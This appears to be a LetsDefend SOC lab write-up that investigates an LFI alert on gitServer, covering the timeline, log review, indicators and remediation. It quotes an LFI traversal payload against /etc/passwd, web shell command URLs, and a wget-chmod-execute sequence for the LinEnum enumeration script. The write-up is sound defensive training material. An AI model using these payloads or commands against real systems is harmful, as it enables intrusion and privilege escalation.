# SOC129 – Successful Local File Inclusion

**Platform:** LetsDefend | **Severity:** High | **Classification:** False Positive (alert) / Compromise found | **Date:** February 21, 2021
**Source:** `49.234.71.65` | **Target:** `172.16.20.4` (gitServer)

## Summary

An external IP sent a Local File Inclusion request for `/etc/passwd` to gitServer. The server responded **404**, so the LFI the alert reported did not succeed, and LetsDefend grades the alert a false positive. However, the same IP returned the next day and ran commands on gitServer through a web shell, which endpoint terminal history confirms. The server was compromised and was contained.

[SCREENSHOT: SOC129 alert expanded on the Monitoring page]

## The Attack

**Local File Inclusion (LFI)** abuses a page that loads files by name. Here, `show.php?page=` was given `../../../../../../etc/passwd`. Each `../` climbs one folder, escaping the web directory to reach `/etc/passwd`, the Linux file listing user accounts.

A **web shell** is a script uploaded to a web server that runs whatever command is passed in the URL, giving the attacker command execution on the server.

## Timeline

| Time (proxy) | Event |
| --- | --- |
| 02-21 09:02:59 | LFI request: `show.php?page=../../../../../../etc/passwd` |
| 02-21 09:02:18 / 09:02:35 | gitServer responds **404** to the attacker (port 33212)* |
| 02-21 11:57:47 | Request for `https://amesiana.com/` through gitServer (likely open-proxy test) |
| 02-22 08:31:56 | Attacker visits `upload.php` |
| 02-22 08:32:33 | `phpshell.php?cmd=whoami`, executed on gitServer |
| 02-22 08:33:15 | `phpshell.php?cmd=cat /etc/passwd`, executed on gitServer |

*The response entries are timestamped slightly before the request entry, a minor discrepancy between log entries. Endpoint time is 8 hours ahead of proxy time.

## Investigation

### 1. Log Analysis

Searching `49.234.71.65` as the **source** returned five requests to gitServer, all allowed by the proxy.

[SCREENSHOT: Log Management, `Source Address contains "49.234.71.65"`, 5 events]

Searching it as the **destination** returned gitServer's responses: two **404 Not Found** on port 33212, the LFI connection. The LFI failed. No responses were logged for the day-2 requests (port 42212).

[SCREENSHOT: Log Management, `Destination Address contains "49.234.71.65"`, two 404 responses]

### 2. Threat Intelligence

`49.234.71.65` belongs to Tencent Cloud (AS45090, China) and shows 0/92 on VirusTotal. Cloud IPs are frequently reassigned and the alert dates to 2021, so the clean result does not reflect the IP's status at the time. The request URL could not be checked, as it points to an internal IP.

[SCREENSHOT: VirusTotal result for 49.234.71.65]

### 3. Endpoint Analysis

gitServer's terminal history confirms the web shell commands ran, matching the proxy requests minute for minute:

| Endpoint time | Command |
| --- | --- |
| 2021-02-22 16:32 | `whoami` |
| 2021-02-22 16:33 | `cat /etc/passwd` |

It also shows earlier, unexplained activity eight days before the alert:

| Endpoint time | Command |
| --- | --- |
| 2021-02-13 16:47 | `wget .../LinEnum/master/LinEnum.sh -o /tmp/ah22idah.sh` |
| 2021-02-13 16:49 | `chmod +x /tmp/ah22idah.sh` |
| 2021-02-13 16:50 | `./tmp/ah22idah.sh` |

**LinEnum** searches a Linux system for privilege-escalation paths. Saving it under a random-looking name suggests an attempt to avoid notice. Its link to this attacker is unconfirmed.

[SCREENSHOT: Endpoint Security, gitServer Terminal History tab]

## Indicators of Compromise

| Type | Indicator |
| --- | --- |
| Source IP | `49.234.71.65` |
| LFI URL | `172.16.20.4/srcCode/show.php?page=../../../../../../etc/passwd` |
| Web Shell URL | `172.16.20.4/srcCode/phpshell.php` |
| Dropped File | `/tmp/ah22idah.sh` (LinEnum) |

## Response and Recommendations

gitServer was contained. Next steps: escalate to incident response, remove `phpshell.php` and `/tmp/ah22idah.sh`, investigate the 2021-02-13 LinEnum activity, restrict or remove `upload.php`, rotate credentials on the server, block `49.234.71.65`, and patch the OS (Ubuntu 16.04.4, out of standard support since April 2021).

[SCREENSHOT: Endpoint Security, gitServer showing Host Contained]

## Conclusion

**False Positive (as alerted), compromise confirmed.** The LFI request returned 404, so the alert's claim of a successful file inclusion was false. Independent of the alert, the attacker uploaded a web shell and executed commands on gitServer, and earlier privilege-escalation enumeration was found on the host. Containment and escalation were warranted.

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell), T1033 (System Owner/User Discovery), T1087.001 (Local Account Discovery), T1105 (Ingress Tool Transfer)
